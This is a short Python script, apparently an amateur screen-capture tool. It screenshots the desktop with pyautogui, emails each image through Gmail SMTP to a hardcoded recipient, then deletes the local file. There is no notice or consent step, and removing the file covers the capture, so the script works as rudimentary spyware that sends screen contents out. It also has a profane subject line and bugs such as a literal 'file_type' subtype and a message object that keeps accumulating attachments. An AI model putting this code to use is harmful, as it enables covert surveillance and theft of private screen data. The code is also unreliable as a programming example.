import smtplib
import imghdr
import os
import pyautogui
import time
from email.message import EmailMessage




msg=EmailMessage()
msg['Subject']="this is subject bitch"
msg['From']="testscript22@gmail.com"
msg['To']='vishnuchttrj@gmail.com'
msg.set_content("this is the main mail")


def senditnow():
    with open('screenshot.png', 'rb') as f:
        file_data=f.read()
        file_type=imghdr.what(f.name)
        file_name=f.name

        msg.add_attachment(file_data,maintype='image',subtype='file_type',filename=file_name)
    with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
        
        smtp.login("add sender email address here","add sender password here")

        smtp.send_message(msg)
    os.remove("screenshot.png")




time_itr=5
curr_time=time.time()
for i in range(2):
    sc = pyautogui.screenshot()
    sc.save(r'screenshot.png')
    senditnow()









    